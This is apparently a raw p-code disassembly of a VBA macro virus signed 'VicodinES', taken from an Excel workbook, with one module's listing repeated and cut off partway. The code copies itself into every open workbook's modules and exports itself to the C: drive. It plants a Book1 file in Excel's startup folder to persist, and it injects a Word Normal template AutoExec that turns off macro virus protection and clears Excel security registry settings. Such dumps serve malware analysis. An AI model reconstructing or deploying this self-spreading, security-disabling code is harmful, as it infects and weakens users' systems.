' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet15 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
